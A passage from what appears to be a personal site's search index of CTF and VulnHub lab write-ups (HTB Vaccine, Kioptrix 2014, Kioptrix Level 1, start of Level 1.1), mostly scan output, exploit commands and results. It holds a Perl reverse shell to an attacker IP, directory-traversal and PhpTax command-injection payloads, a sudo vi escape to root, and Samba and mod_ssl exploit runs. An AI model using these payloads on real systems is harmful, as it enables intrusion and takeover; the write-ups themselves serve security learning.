remote machine with ssh to get a better shell</li> </ul> <pre><code># remote\npostgres@vaccine:/var/lib/postgresql/.ssh$ cat id_rsa\n</code></pre> <pre><code># local\n$ chmod 600 id_rsa\n\n$ ssh -i id_rsa postgres@10.129.103.216\nWelcome to Ubuntu 19.10 (GNU/Linux 5.3.0-64-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/advantage\n\n  System information as of Tue 21 Nov 2023 07:25:11 PM UTC\n\n  System load:  0.0               Processes:             184\n  Usage of /:   32.6% of 8.73GB   Users logged in:       0\n  Memory usage: 20%               IP address for ens160: 10.129.103.216\n  Swap usage:   0%\n\n\n0 updates can be installed immediately.\n0 of these updates are security updates.\n\n\nThe list of available updates is more than a week old.\nTo check for new updates run: sudo apt update\n\n\nThe programs included with the Ubuntu system are free software;\nthe exact distribution terms for each program are described in the\nindividual files in /usr/share/doc/*/copyright.\n\nUbuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by\napplicable law.\n</code></pre>"},{"location":"Write-ups/thb/starting_point/Vaccine/#postgress-db","title":"postgres's db","text":"<ul> <li>enumerate sensitive data</li> </ul> <pre><code>postgres@vaccine:/var/www/html$ cat dashboard.php | grep conn\n$conn = pg_connect(\"host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!\");\n</code></pre> <ul> <li>indicate: db, username, password</li> <li>find proc listening to port 5432</li> </ul> <pre><code>postgres@vaccine:/var/www/html$ lsof -i:5432\nCOMMAND   PID     USER   FD   TYPE DEVICE SIZE/OFF NODE NAME\npostgres 4439 postgres    3u  IPv4 117326      0t0  TCP localhost:postgresql (LISTEN)\n</code></pre> <ul> <li>conn db [x]</li> </ul> <pre><code>postgres@vaccine:/var/www/html$ psql -h localhost -p 5432 -d carsdb -U postgres\nPassword for user postgres:\npsql (11.7 (Ubuntu 11.7-0ubuntu0.19.10.1))\nSSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)\nType \"help\" for help.\n\ncarsdb=#\n</code></pre>"},{"location":"Write-ups/thb/starting_point/Vaccine/#postgres-root","title":"postgres -&gt; root","text":"<ul> <li>sudo -l</li> </ul> <pre><code>postgres@vaccine:/var/www/html$ sudo -l\nMatching Defaults entries for postgres on vaccine:\n    env_keep+=\"LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET\", env_keep+=\"XAPPLRESDIR XFILESEARCHPATH\n    XUSERFILESEARCHPATH\", secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, mail_badpass\n\nUser postgres may run the following commands on vaccine:\n    (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf\n</code></pre> <ul> <li>vi -&gt; :!/bin/bash -&gt; root priv</li> </ul> <pre><code>root@vaccine:/var/www/html# uname -a\nLinux vaccine 5.3.0-64-generic #58-Ubuntu SMP Fri Jul 10 19:33:51 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux\nroot@vaccine:/var/www/html# ip a\n1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000\n    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n    inet 127.0.0.1/8 scope host lo\n       valid_lft forever preferred_lft forever\n    inet6 ::1/128 scope host\n       valid_lft forever preferred_lft forever\n2: ens160: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000\n    link/ether 00:50:56:b0:8c:1b brd ff:ff:ff:ff:ff:ff\n    inet 10.129.103.216/16 brd 10.129.255.255 scope global dynamic ens160\n       valid_lft 2462sec preferred_lft 2462sec\n    inet6 dead:beef::250:56ff:feb0:8c1b/64 scope global dynamic mngtmpaddr\n       valid_lft 86396sec preferred_lft 14396sec\n    inet6 fe80::250:56ff:feb0:8c1b/64 scope link\n       valid_lft forever preferred_lft forever\n</code></pre>"},{"location":"Write-ups/vulnhub/KIOPTRIX%202014%20%285%29/","title":"KIOPTRIX 2014 (5)","text":""},{"location":"Write-ups/vulnhub/KIOPTRIX%202014%20%285%29/#machine-info","title":"Machine Info","text":"<ul> <li>Name: Kioptrix: 2014 (#5)</li> <li>Date release: 6 Apr 2014</li> <li>Author: Kioptrix</li> <li>Series: Kioptrix</li> <li>Web page: http://www.kioptrix.com/blog/a-new-vm-after-almost-2-years/</li> <li>VulnHub: Kioptrix: 2014 (#5) ~ VulnHub</li> </ul>"},{"location":"Write-ups/vulnhub/KIOPTRIX%202014%20%285%29/#pwk","title":"PWK","text":""},{"location":"Write-ups/vulnhub/KIOPTRIX%202014%20%285%29/#recon","title":"recon","text":"<ul> <li>FreeBSD 9.0</li> <li>Apache 2.2.21</li> <li>PHP</li> <li>OpenSSL</li> <li>user: www, root</li> </ul>"},{"location":"Write-ups/vulnhub/KIOPTRIX%202014%20%285%29/#nmap","title":"nmap","text":"<pre><code>PORT     STATE  SERVICE VERSION\n22/tcp   closed ssh\n80/tcp   open   http    Apache httpd 2.2.21 ((FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8)\n|_http-title: Site doesn't have a title (text/html).\n8080/tcp open   http    Apache httpd 2.2.21 ((FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8)\nMAC Address: 00:0C:29:CC:71:59 (VMware)\nAggressive OS guesses: FreeBSD 7.0-RELEASE - 9.0-RELEASE (93%), Juniper MAG2600 SSL VPN gateway (IVE OS 7.3) (92%), Linksys WAP54G WAP (92%), ISS Proventia GX3002C firewall (Linux 2.4.18) (92%), Linux 2.6.20 (92%), Linux 2.6.18 (91%), Linux 2.6.23 (91%), Linux 2.6.24 (91%), FreeBSD 7.0-RC1 (91%), FreeBSD 7.0-STABLE (91%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 1 hop\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 28.96 seconds\n</code></pre>"},{"location":"Write-ups/vulnhub/KIOPTRIX%202014%20%285%29/#path","title":"path","text":"<ul> <li>80 port, <code>$ dirb http://$IP</code></li> </ul> <pre><code>-----------------\nDIRB v2.22\nBy The Dark Raver\n-----------------\n\nSTART_TIME: Fri Nov 17 05:36:11 2023\nURL_BASE: http://192.168.123.127/\nWORDLIST_FILES: /usr/share/dirb/wordlists/common.txt\n\n-----------------\n\nGENERATED WORDS: 4612\n\n---- Scanning URL: http://192.168.123.127/ ----\n+ http://192.168.123.127/cgi-bin/ (CODE:403|SIZE:210)\n+ http://192.168.123.127/index.html (CODE:200|SIZE:152)\n\n-----------------\nEND_TIME: Fri Nov 17 05:36:36 2023\nDOWNLOADED: 4612 - FOUND: 2\n</code></pre> <ul> <li>check html source code, find another url path: <code>pChart2.1.3/index.php</code></li> </ul> <pre><code>&lt;html&gt;\n &lt;head&gt;\n  &lt;!--\n  &lt;META HTTP-EQUIV=\"refresh\" CONTENT=\"5;URL=pChart2.1.3/index.php\"&gt;\n  --&gt;\n &lt;/head&gt;\n\n &lt;body&gt;\n  &lt;h1&gt;It works!&lt;/h1&gt;\n &lt;/body&gt;\n&lt;/html&gt;\n</code></pre> <ul> <li>web</li> </ul> <pre><code>$ whatweb http://192.168.123.127/pChart2.1.3/examples/index.php\nhttp://192.168.123.127/pChart2.1.3/examples/index.php [200 OK] Apache[2.2.21][mod_ssl/2.2.21], Country[RESERVED][ZZ], HTTPServer[FreeBSD][Apache/2.2.21 (FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8], IP[192.168.123.127], OpenSSL[0.9.8q], PHP[5.3.8], Script, Title[pChart 2.x - examples rendering], WebDAV[2], X-Powered-By[PHP/5.3.8]\n</code></pre> <ul> <li>8080 port, <code>$ gobuster dir -u http://192.168.123.127:8080/phptax -a \"Mozilla/4.0 Mozilla4_browser\" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x json,html,php,txt,xml,md -q</code></li> </ul> <pre><code>/.html                (Status: 403) [Size: 214]\n/index.php            (Status: 200) [Size: 11974]\n/files                (Status: 301) [Size: 249] [--&gt; http://192.168.123.127:8080/phptax/files/]\n/data                 (Status: 301) [Size: 248] [--&gt; http://192.168.123.127:8080/phptax/data/]\n/pictures             (Status: 301) [Size: 252] [--&gt; http://192.168.123.127:8080/phptax/pictures/]\n/maps                 (Status: 301) [Size: 248] [--&gt; http://192.168.123.127:8080/phptax/maps/]\n/readme               (Status: 301) [Size: 250] [--&gt; http://192.168.123.127:8080/phptax/readme/]\n</code></pre>"},{"location":"Write-ups/vulnhub/KIOPTRIX%202014%20%285%29/#exploit","title":"exploit","text":""},{"location":"Write-ups/vulnhub/KIOPTRIX%202014%20%285%29/#pchart-direcotry-traversal","title":"pChart - direcotry traversal","text":"<ul> <li>pChart 2.1.3</li> <li><code>$ searchsploit pChart</code></li> </ul> <pre><code>$ searchsploit pChart\npChart 2.1.3 - Multiple Vulnerabilities                                                                                              | php/webapps/31173.txt\n[1] Directory Traversal:\nhxxp://localhost/examples/index.php?Action=View&amp;Script=%2f..%2f..%2fetc/passwd\nThe traversal is executed with the web server's privilege and leads to\nsensitive file disclosure (passwd, siteconf.inc.php or similar),\naccess to source codes, hardcoded passwords or other high impact\nconsequences, depending on the web server's configuration.\nThis problem may exists in the production code if the example code was\ncopied into the production environment.\n</code></pre> <ul> <li>sensitive data leakage</li> <li><code>http://192.168.123.127/pChart2.1.3/examples/index.php?Action=View&amp;Script=/etc/passwd</code></li> <li>Apache config: <code>http://192.168.123.127/pChart2.1.3/examples/index.php?Action=View&amp;Script=/usr/local/etc/apache22/httpd.conf</code></li> </ul> <pre><code>SetEnvIf User-Agent ^Mozilla/4.0 Mozilla4_browser\n\n&lt;VirtualHost *:8080&gt;\n    DocumentRoot /usr/local/www/apache22/data2\n</code></pre> <ul> <li>set User-Agent, $IP:8080 -&gt; will not be forbidden</li> </ul>"},{"location":"Write-ups/vulnhub/KIOPTRIX%202014%20%285%29/#phptax-remote-code-injection","title":"phptax - remote code injection","text":"<ul> <li>seek exp methods</li> </ul> <pre><code>$ searchsploit phptax [x]\nPhpTax - 'pfilez' Execution Remote Code Injection (Metasploit)                                                                       | php/webapps/21833.rb\nPhpTax 0.8 - File Manipulation 'newvalue' / Remote Code Execution                                                                    | php/webapps/25849.txt\nphptax 0.8 - Remote Code Execution                                                                                                   | php/webapps/21665.txt\n</code></pre> <ul> <li>GET request</li> </ul> <pre><code>GET / HTTP/1.1\nHost: 192.168.123.127:8080\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/4.0 Mozilla4_browser\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nAccept-Encoding: gzip, deflate, br\nAccept-Language: en-US,en;q=0.9\nConnection: close\n</code></pre>"},{"location":"Write-ups/vulnhub/KIOPTRIX%202014%20%285%29/#1-211665","title":"(1) 211665","text":"<ul> <li>poc</li> </ul> <pre><code>After /index.php?pfilez=1040d1-pg2.tob;id&gt;/tmp/qwe;&amp;pdf=make\n$ curl 'http://192.168.123.127/pChart2.1.3/examples/index.php?Action=View&amp;Script=/tmp/qwe'\n&lt;code&gt;&lt;span style=\"color: #000000\"&gt;\nuid=80(www)&amp;nbsp;gid=80(www)&amp;nbsp;groups=80(www)&lt;br /&gt;&lt;/span&gt;\n&lt;/code&gt;\n</code></pre> <ul> <li>validate machine's env</li> <li>python [x]</li> <li>/bin/sh [y]</li> <li>/usr/bin/nc [y]</li> <li>perl [y]</li> </ul> <ul> <li>inject perl code: <code>perl -e 'use Socket;$i=\"192.168.123.15\";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\"&gt;&amp;S\");open(STDOUT,\"&gt;&amp;S\");open(STDERR,\"&gt;&amp;S\");exec(\"sh -i\");};'</code></li> <li>on host, <code>sudo nc -lvnp 1234</code></li> </ul>"},{"location":"Write-ups/vulnhub/KIOPTRIX%202014%20%285%29/#2-21833-metasploit","title":"(2) 21833 - metasploit","text":"<pre><code>msf6 exploit(multi/http/phptax_exec) &gt; options\n\nModule options (exploit/multi/http/phptax_exec):\n\n   Name       Current Setting  Required  Description\n   ----       ---------------  --------  -----------\n   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]\n   RHOSTS     192.168.123.127  yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html\n   RPORT      8080             yes       The target port (TCP)\n   SSL        false            no        Negotiate SSL/TLS for outgoing connections\n   TARGETURI  /phptax/         yes       The path to the web application\n   VHOST                       no        HTTP server virtual host\n\n\nPayload options (cmd/unix/reverse_perl):\n\n   Name   Current Setting  Required  Description\n   ----   ---------------  --------  -----------\n   LHOST  192.168.123.15   yes       The listen address (an interface may be specified)\n   LPORT  4444             yes       The listen port\n\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   PhpTax 0.8\n\n\n\nView the full module info with the info, or info -d command.\n\nmsf6 exploit(multi/http/phptax_exec) &gt; run\n</code></pre>"},{"location":"Write-ups/vulnhub/KIOPTRIX%202014%20%285%29/#priv-esca","title":"priv-esca","text":"<p>after getting a user priv shell (www), enum:</p> <ul> <li>sudo -l [x]</li> <li>suid, guid [x]</li> <li>crontab [x]</li> <li>passwd, shadow [x]</li> <li>freebsd kernel priv esca</li> </ul> <pre><code>$ searchsploit freebsd 9.0\nFreeBSD 9.0 - Intel SYSRET Kernel Privilege Escalation            | freebsd/local/28718.c\nFreeBSD 9.0 &lt; 9.1 - 'mmap/ptrace' Local Privilege Escalation      | freebsd/local/26368.c\n\n# on host\nnc -lvnp 1234 &lt; 26368.c\n# on remote\nnc 192.168.123.15 1234 &gt; 26368.c\ngcc 26368.c\n./a.out\n</code></pre>"},{"location":"Write-ups/vulnhub/KIOPTRIX%20LEVEL%201%20%281%29/","title":"KIOPTRIX LEVEL 1 (1)","text":""},{"location":"Write-ups/vulnhub/KIOPTRIX%20LEVEL%201%20%281%29/#machine-info","title":"Machine Info","text":"<ul> <li>Name: Kioptrix: Level 1 (#1)</li> <li>Date release: 17 Feb 2010</li> <li>Author: Kioptrix</li> <li>Series: Kioptrix</li> <li>Web page: http://www.kioptrix.com/blog/?page_id=135</li> <li>Vulnhub: Kioptrix: Level 1 (#1) ~ VulnHub</li> </ul>"},{"location":"Write-ups/vulnhub/KIOPTRIX%20LEVEL%201%20%281%29/#pwk","title":"PWK","text":"<ul> <li>nmap</li> </ul> <pre><code>$ sudo nmap -sT -sV -sC -O -p22,80,111,139,443,1024 $IP -oA nmap/detail\nStarting Nmap 7.94 ( https://nmap.org ) at 2023-11-15 00:17 CST\nNmap scan report for 192.168.123.28\nHost is up (0.00069s latency).\n\nPORT     STATE SERVICE     VERSION\n22/tcp   open  ssh         OpenSSH 2.9p2 (protocol 1.99)\n| ssh-hostkey:\n|   1024 b8:74:6c:db:fd:8b:e6:66:e9:2a:2b:df:5e:6f:64:86 (RSA1)\n|   1024 8f:8e:5b:81:ed:21:ab:c1:80:e1:57:a3:3c:85:c4:71 (DSA)\n|_  1024 ed:4e:a9:4a:06:14:ff:15:14:ce:da:3a:80:db:e2:81 (RSA)\n|_sshv1: Server supports SSHv1\n80/tcp   open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)\n| http-methods:\n|_  Potentially risky methods: TRACE\n|_http-title: Test Page for the Apache Web Server on Red Hat Linux\n|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b\n111/tcp  open  rpcbind     2 (RPC #100000)\n| rpcinfo:\n|   program version    port/proto  service\n|   100000  2            111/tcp   rpcbind\n|   100000  2            111/udp   rpcbind\n|   100024  1           1024/tcp   status\n|_  100024  1           1024/udp   status\n139/tcp  open  netbios-ssn Samba smbd (workgroup: tMYGROUP)\n443/tcp  open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b\n|_ssl-date: 2023-11-14T17:20:07+00:00; +1h01m50s from scanner time.\n| sslv2:\n|   SSLv2 supported\n|   ciphers:\n|     SSL2_DES_64_CBC_WITH_MD5\n|     SSL2_RC2_128_CBC_WITH_MD5\n|     SSL2_RC4_128_EXPORT40_WITH_MD5\n|     SSL2_DES_192_EDE3_CBC_WITH_MD5\n|     SSL2_RC4_64_WITH_MD5\n|     SSL2_RC4_128_WITH_MD5\n|_    SSL2_RC2_128_CBC_EXPORT40_WITH_MD5\n| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--\n| Not valid before: 2009-09-26T09:32:06\n|_Not valid after:  2010-09-26T09:32:06\n|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b\n|_http-title: 400 Bad Request\n1024/tcp open  status      1 (RPC #100024)\nMAC Address: 00:0C:29:56:FD:5F (VMware)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose\nRunning: Linux 2.4.X\nOS CPE: cpe:/o:linux:linux_kernel:2.4\nOS details: Linux 2.4.9 - 2.4.18 (likely embedded)\nNetwork Distance: 1 hop\n\nHost script results:\n|_smb2-time: Protocol negotiation failed (SMB2)\n|_nbstat: NetBIOS name: KIOPTRIX, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)\n|_clock-skew: 1h01m49s\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 36.60 seconds\n</code></pre> <ul> <li> <p>80 - http - no work</p> <ul> <li>path</li> </ul> </li> </ul> <pre><code>$ dirb http://$IP\n\n-----------------\nDIRB v2.22\nBy The Dark Raver\n-----------------\n\nSTART_TIME: Wed Nov 15 01:30:18 2023\nURL_BASE: http://192.168.123.28/\nWORDLIST_FILES: /usr/share/dirb/wordlists/common.txt\n\n-----------------\n\nGENERATED WORDS: 4612\n\n---- Scanning URL: http://192.168.123.28/ ----\n+ http://192.168.123.28/~operator (CODE:403|SIZE:273)\n+ http://192.168.123.28/~root (CODE:403|SIZE:269)\n+ http://192.168.123.28/cgi-bin/ (CODE:403|SIZE:272)\n+ http://192.168.123.28/index.html (CODE:200|SIZE:2890)\n==&gt; DIRECTORY: http://192.168.123.28/manual/\n==&gt; DIRECTORY: http://192.168.123.28/mrtg/\n==&gt; DIRECTORY: http://192.168.123.28/usage/\n\n---- Entering directory: http://192.168.123.28/manual/ ----\n(!) WARNING: Directory IS LISTABLE. No need to scan it.\n    (Use mode '-w' if you want to scan it anyway)\n\n---- Entering directory: http://192.168.123.28/mrtg/ ----\n+ http://192.168.123.28/mrtg/index.html (CODE:200|SIZE:17318)\n\n---- Entering directory: http://192.168.123.28/usage/ ----\n+ http://192.168.123.28/usage/index.html (CODE:200|SIZE:3704)\n\n-----------------\nEND_TIME: Wed Nov 15 01:30:44 2023\nDOWNLOADED: 13836 - FOUND: 6\n</code></pre> <ul> <li>mrtg [x]</li> <li>manual [x]</li> <li>searchsploit apache [x]</li> </ul> <pre><code>$ searchsploit apache 1.3.20\nApache mod_ssl &lt; 2.8.7 OpenSSL - 'OpenFuck.c' Remote Buffer Overflow                                                                 | unix/remote/21671.c [x]\nApache mod_ssl &lt; 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow (1)                                                           | unix/remote/764.c   [x]\nApache mod_ssl &lt; 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow (2)                                                           | unix/remote/47080.c [*]\n\n$ searchsploit apache 1.3 remote\nApache 1.3.x mod_mylo - Remote Code Execution                                                                                        | multiple/remote/67.c\nRed-Hat version: unknow\n=&gt;\n$ ./67 -t $IP -T 1\n[-] Attempting attack [ RedHat 7.2, Apache 1.3.20 (installed from RPM) ] ...\n[-] Trying 0x08105104 ...\n\n\n\n[*] Connection to 196.168.123.28 was rejected\n\nHave a nice day!\n\n=&gt; 47080\n$ ./OpenFuck\n\n*******************************************************************\n* OpenFuck v3.0.4-root priv8 by SPABAM based on openssl-too-open *\n*******************************************************************\n* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *\n* #hackarena  irc.brasnet.org                                     *\n* TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *\n* #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *\n* #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *\n*******************************************************************\n\n: Usage: ./OpenFuck target box [port] [-c N]\n\n  target - supported box eg: 0x00\n  box - hostname or IP address\n  port - port for ssl connection\n  -c open N connections. (use range 40-50 if u dont know)\n\n\n  Supported OffSet:\n        0x6a - RedHat Linux 7.2 (apache-1.3.20-16)1\n        0x6b - RedHat Linux 7.2 (apache-1.3.20-16)2\n\nFuck to all guys who like use lamah ddos. Read SRC to have no surprise\n\n$ ./OpenFuck 0x6a $IP 443 -c 45\n\n*******************************************************************\n* OpenFuck v3.0.4-root priv8 by SPABAM based on openssl-too-open *\n*******************************************************************\n* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *\n* #hackarena  irc.brasnet.org                                     *\n* TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *\n* #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *\n* #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *\n*******************************************************************\n\nConnection... 1 of 45Connection to 196.168.123.28:443 failed: Connection timed out\n</code></pre> <ul> <li>139 - smb<ul> <li>file lekage -&gt; smbclient connect [x]</li> </ul> </li> </ul> <pre><code>$ smbclient //$IP/IPC$\nPassword for [WORKGROUP\\qwe]:\nServer does not support EXTENDED_SECURITY  but 'client use spnego = yes' and 'client ntlmv2 auth = yes' is set\nAnonymous login successful\nTry \"help\" to get a list of possible commands.\nsmb: \\&gt; dir\nNT_STATUS_NETWORK_ACCESS_DENIED listing \\*\nsmb: \\&gt; ls\nNT_STATUS_NETWORK_ACCESS_DENIED listing \\*\nsmb: \\&gt; ^C\n\n$ smbclient //$IP/ADMIN$\nPassword for [WORKGROUP\\qwe]:\nServer does not support EXTENDED_SECURITY  but 'client use spnego = yes' and 'client ntlmv2 auth = yes' is set\nAnonymous login successful\ntree connect failed: NT_STATUS_WRONG_PASSWORD\n</code></pre> <ul> <li>smb version - exploit - 2 ways ok<ul> <li>trans2open Overflow</li> <li>Remote Code Execution [this wp]</li> </ul> </li> </ul> <pre><code>msf6 &gt; search scanner smb version\n\nMatching Modules\n================\n\n   #  Name                               Disclosure Date  Rank    Check  Description\n   -  ----                               ---------------  ----    -----  -----------\n   0  auxiliary/scanner/smb/smb_version                   normal  No     SMB Version Detection\n\n\nInteract with a module by name or index. For example info 0, use 0 or use auxiliary/scanner/smb/smb_version\n\nmsf6 &gt; use 0\nmsf6 auxiliary(scanner/smb/smb_version) &gt; show options\n\nModule options (auxiliary/scanner/smb/smb_version):\n\n   Name     Current Setting  Required  Description\n   ----     ---------------  --------  -----------\n   RHOSTS                    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html\n   THREADS  1                yes       The number of concurrent threads (max one per host)\n\n\nView the full module info with the info, or info -d command.\n\nmsf6 auxiliary(scanner/smb/smb_version) &gt; set RHOST\nset RHOSTNAME  set RHOSTS\nmsf6 auxiliary(scanner/smb/smb_version) &gt; set RHOSTS 192.168.123.28\nRHOSTS =&gt; 192.168.123.28\nmsf6 auxiliary(scanner/smb/smb_version) &gt; run\n\n[*] 192.168.123.28:139    - SMB Detected (versions:) (preferred dialect:) (signatures:optional)\n[*] 192.168.123.28:139    -   Host could not be identified: Unix (Samba 2.2.1a)\n[*] 192.168.123.28:       - Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\n</code></pre> <pre><code>=&gt; searchsploit samba 2.2.1\n$ searchsploit samba 2.2.1\n\nSamba 2.2.0 &lt; 2.2.8 (OSX) - trans2open Overflow (Metasploit)                                                                         | osx/remote/9924.rb\nSamba &lt; 2.2.8 (Linux/BSD) - Remote Code Execution                                                                                    | multiple/remote/10.c\nSamba &lt; 3.0.20 - Remote Heap Overflow                                                                                                | linux/remote/7701.txt\nSamba &lt; 3.6.2 (x86) - Denial of Service (PoC)                                                                                        | linux_x86/dos/36741.py\n\nShellcodes: No Results\n\n\nDONE:\nUsage: ./sambal [-bBcCdfprsStv] [host]\n\n-b &lt;platform&gt;   bruteforce (0 = Linux, 1 = FreeBSD/NetBSD, 2 = OpenBSD 3.1 and prior, 3 = OpenBSD 3.2)\n-B &lt;step&gt;       bruteforce steps (default = 300)\n-c &lt;ip address&gt; connectback ip address\n-C &lt;max childs&gt; max childs for scan/bruteforce mode (default = 40)\n-d &lt;delay&gt;      bruteforce/scanmode delay in micro seconds (default = 100000)\n-f              force\n-p &lt;port&gt;       port to attack (default = 139)\n-r &lt;ret&gt;        return address\n-s              scan mode (random)\n-S &lt;network&gt;    scan mode\n-t &lt;type&gt;       presets (0 for a list)\n-v              verbose mode\n\n$ ./sambal -d 0 -C 60 -S 192.168.123\nsamba-2.2.8 &lt; remote root exploit by eSDee (www.netric.org|be)\n--------------------------------------------------------------\n+ Scan mode.\n+ [192.168.123.28] Samba\n^C\n\n$ ./sambal -d 0 -v -b 0 192.168.123.28\n+ Worked!\n--------------------------------------------------------------\n*** JE MOET JE MUIL HOUWE\nLinux kioptrix.level1 2.4.7-10 #1 Thu Sep 6 16:46:36 EDT 2001 i686 unknown\nuid=0(root) gid=0(root) groups=99(nobody)\n</code></pre>"},{"location":"Write-ups/vulnhub/KIOPTRIX%20LEVEL%201.1%20%282%29/","title":"KIOPTRIX LEVEL 1.1 (2)","text":""},{"location":"Write-ups/vulnhub/KIOPTRIX%20LEVEL%201.1%20%282%29/#machine-info","title":"Machine Info","text":"<ul> <li>Name: Kioptrix: Level 1.1 (#2)</li> <li>Date release: 11 Feb 2011</li> <li>Author: Kioptrix</li> <li>Series: Kioptrix</li> <li>Web page: http://www.kioptrix.com/blog/?page_id=135</li> <li>Vulnhub: Kioptrix: Level 1.1 (#2) ~ VulnHub</li> </ul>"},{"location":"Write-ups/vulnhub/KIOPTRIX%20LEVEL%201.1%20%282%29/#pwk","title":"PWK","text":""},{"location":"Write-ups/vulnhub/KIOPTRIX%20LEVEL%201.1%20%282%29/#recon","title":"recon","text":"<ul> <li>nmap</li> </ul> <pre><code>$ sudo nmap -sT -sV -sC -O -p22,80,111,443,631,778,3306 $IP -oA nmap/detail\nStarting Nmap 7.94 ( https://nmap.org ) at 2023-11-15 04:06 CST\nNmap scan report for 192.168.123.75\nHost is up (0.0010s latency).\n\nPORT     STATE SERVICE  VERSION\n22/tcp   open  ssh      OpenSSH 3.9p1 (protocol 1.99)\n|_sshv1: Server supports SSHv1\n| ssh-hostkey:\n|   1024 8f:3e:8b:1e:58:63:fe:cf:27:a3:18:09:3b:52:cf:72 (RSA1)\n|   1024 34:6b:45:3d:ba:ce:ca:b2:53:55:ef:1e:43:70:38:36 (DSA)\n|_  1024 68:4d:8c:bb:b6:5a:bd:79:71:b8:71:47:ea:00:42:61 (RSA)\n80/tcp   open  http     Apache httpd 2.0.52 ((CentOS))\n|_http-title: Site doesn't have a title (text/html; charset=UTF-8).\n|_http-server-header: Apache/2.0.52 (CentOS)\n111/tcp  open  rpcbind  2 (RPC #100000)\n| rpcinfo:\n|   program version    port/proto  service\n|   100000  2            111/tcp   rpcbind\n|_  100000  2            111/udp   rpcbind\n443/tcp  open  ssl/http Apache httpd 2.0.52 ((CentOS))\n| sslv2:\n|   SSLv2 supported\n|   ciphers:\n|     SSL2_RC4_64_WITH_MD5\n|     SSL2_RC4_128_EXPORT40_WITH_MD5\n|     SSL2_DES_192_EDE3_CBC_WITH_MD5\n|     SSL2_DES_64_CBC_WITH_MD5\n|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5\n|     SSL2_RC2_128_CBC_WITH_MD5\n|_    SSL2_RC4_128_WITH_MD5\n|_http-title: Site doesn't have a title (text/html; charset=UTF-8).\n|_http-server-header: Apache/2.0.52 (CentOS)\n| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--\n| Not valid before: 2009-10-08T00:10:47\n|_Not valid after:  2010-10-08T00:10:47\n|_ssl-date: 2023-11-14T17:57:13+00:00; -2h09m39s from scanner time.\n631/tcp  open  ipp      CUPS 1.1\n|_http-server-header: CUPS/1.1\n| http-methods:\n|_  Potentially risky methods: PUT\n|_http-title: 403 Forbidden\n778/tcp  open  status   1 (RPC #100024)\n3306/tcp open  mysql    MySQL (unauthorized)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose|printer|specialized|remote management|media device|WAP|terminal server\nRunning (JUST GUESSING): Linux 2.6.X (97%), HP embedded (95%), Riverbed RiOS (94%), Aruba ArubaOS 3.X (93%), Star Track embedded (93%), Aerohive HiveOS 3.X (92%), Source Technologies embedded (92%), Aruba embedded (92%)\nOS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:riverbed:rios cpe:/o:arubanetworks:arubaos:3.3.2 cpe:/o:linux:linux_kernel:2.6.23 cpe:/h:star_track:srt2014hd cpe:/o:aerohive:hiveos:3.4 cpe:/h:sourcetechnologies:st-9650 